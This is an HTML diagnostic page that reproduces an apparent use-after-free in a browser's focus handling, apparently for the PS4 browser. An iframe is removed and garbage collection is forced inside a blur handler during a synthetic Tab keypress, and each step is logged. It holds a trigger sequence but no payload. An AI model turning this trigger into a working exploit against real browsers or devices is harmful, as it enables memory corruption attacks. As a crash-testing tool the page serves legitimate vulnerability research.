<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>FocusController UAF - PS4 Diagnostic</title>

<style>
body {
    font-family: sans-serif;
    margin: 20px;
}

#status {
    font-size: 18px;
    margin-bottom: 15px;
}

#log {
    white-space: pre-wrap;
    font-family: monospace;
    font-size: 13px;
    border: 1px solid #999;
    padding: 10px;
}

iframe {
    width: 250px;
    height: 80px;
}
</style>
</head>

<body>

<div id="status">INITIALIZING...</div>
<div id="log"></div>

<script>

/*
 * ============================================================
 * LOG
 * ============================================================
 */

var logElement = document.getElementById("log");
var statusElement = document.getElementById("status");

function log(message) {
    logElement.textContent += message + "\n";
}

function status(message) {
    statusElement.textContent = message;
}

function describeElement(element) {

    if (!element)
        return "null";

    var result = element.tagName || element.nodeName;

    if (element.id)
        result += "#" + element.id;

    return result;
}

function logFocus(label) {

    log(
        "[" + label + "] " +
        "hasFocus=" + document.hasFocus() +
        " activeElement=" +
        describeElement(document.activeElement)
    );
}


/*
 * ============================================================
 * GC FALLBACK
 *
 * Baseado no gc.js fornecido.
 * ============================================================
 */

if (!window.gc) {

    window.gc = function() {

        log("[GC] start");

        function gcRec(n) {

            if (n < 1)
                return {};

            var temp = {
                i: "ab" + i + (i / 100000)
            };

            temp += "foo";

            gcRec(n - 1);
        }

        for (var i = 0; i < 10000; i++)
            gcRec(10);

        log("[GC] end");
    };
}


/*
 * ============================================================
 * FOCUS EVENTS
 *
 * Apenas observação.
 * ============================================================
 */

window.addEventListener("focus", function() {
    logFocus("WINDOW FOCUS");
});

window.addEventListener("blur", function() {
    logFocus("WINDOW BLUR");
});

document.addEventListener("focusin", function(event) {

    log(
        "[FOCUSIN] target=" +
        describeElement(event.target) +
        " active=" +
        describeElement(document.activeElement)
    );

});

document.addEventListener("focusout", function(event) {

    log(
        "[FOCUSOUT] target=" +
        describeElement(event.target) +
        " active=" +
        describeElement(document.activeElement)
    );

});


/*
 * ============================================================
 * START
 * ============================================================
 */

log("[0] SCRIPT START");
logFocus("INITIAL");


/*
 * ============================================================
 * OUTER INPUT
 * ============================================================
 */

var outerInput = document.createElement("input");

outerInput.id = "outerInput";

document.body.appendChild(outerInput);

log("[1] outerInput created");


/*
 * ============================================================
 * IFRAME
 * ============================================================
 */

var iframe = document.createElement("iframe");

iframe.id = "targetFrame";
iframe.tabIndex = 0;

iframe.srcdoc =
    "<input tabindex='0'>" +
    "<script>" +
    "parent.innerInput = document.querySelector('input');" +
    "<\/script>";

document.body.appendChild(iframe);

log("[2] iframe created");

logFocus("AFTER IFRAME");


/*
 * ============================================================
 * IFRAME LOAD
 * ============================================================
 */

iframe.onload = function() {

    log("[3] iframe.onload");

    logFocus("IFRAME ONLOAD");

    setTimeout(function() {

        log("[4] setTimeout(runTest)");

        runTest();

    }, 0);
};


/*
 * ============================================================
 * TEST
 * ============================================================
 */

function runTest() {

    log("[5] runTest()");

    logFocus("BEFORE TEST");


    /*
     * Obtain inner input.
     */

    var innerInput = window.innerInput;

    window.innerInput = null;

    log(
        "[6] innerInput=" +
        describeElement(innerInput)
    );


    if (!innerInput) {

        status("FAIL: innerInput missing");

        log("[STOP] innerInput missing");

        return;
    }


    /*
     * ========================================================
     * BLUR HANDLER
     * ========================================================
     */

    outerInput.addEventListener("blur", function() {

        log("");
        log("========== BLUR HANDLER ==========");

        status("BLUR HANDLER");

        logFocus("BLUR ENTRY");


        /*
         * Original:
         *
         * document.adoptNode(innerInput);
         */

        log("[7] document.adoptNode(innerInput)");

        document.adoptNode(innerInput);

        log("[8] adoptNode completed");

        innerInput = null;

        log("[9] innerInput = null");


        /*
         * Original:
         *
         * iframe.remove();
         */

        log("[10] iframe.remove()");

        iframe.remove();

        log("[11] iframe.remove() completed");

        iframe = null;

        log("[12] iframe = null");


        /*
         * GC pressure.
         */

        log("[13] calling gc()");

        status("GC PRESSURE");

        gc();

        log("[14] gc() completed");

        logFocus("AFTER GC");

        status("BLUR SEQUENCE COMPLETED");

    }, {
        once: true
    });


    /*
     * ========================================================
     * FOCUS
     * ========================================================
     */

    log("");
    log("========== FOCUS SEQUENCE ==========");

    status("FOCUS SEQUENCE");

    logFocus("BEFORE outerInput.focus()");


    log("[15] outerInput.focus()");

    outerInput.focus();


    log("[16] outerInput.focus() completed");

    logFocus("AFTER outerInput.focus()");


    /*
     * ========================================================
     * KEYBOARD EVENT
     * ========================================================
     */

    log("[17] dispatch KeyboardEvent(Tab)");

    outerInput.dispatchEvent(
        new KeyboardEvent("keydown", {
            bubbles: true,
            cancelable: true,
            view: window,
            detail: 0,

            key: "Tab",
            code: "Tab",
            keyIdentifier: "U+0009",

            location: 222,

            ctrlKey: false,
            altKey: true,
            shiftKey: false,
            metaKey: false
        })
    );


    log("[18] KeyboardEvent dispatch completed");

    logFocus("AFTER KEYDOWN");


    /*
     * ========================================================
     * DO NOT replace document.body.
     *
     * This is intentionally different from the original
     * final presentation step so the diagnostic log survives.
     * ========================================================
     */

    log("[19] TEST SEQUENCE FINISHED");

    status("This test passes if PASS (no crash)");

}

</script>

</body>
</html>
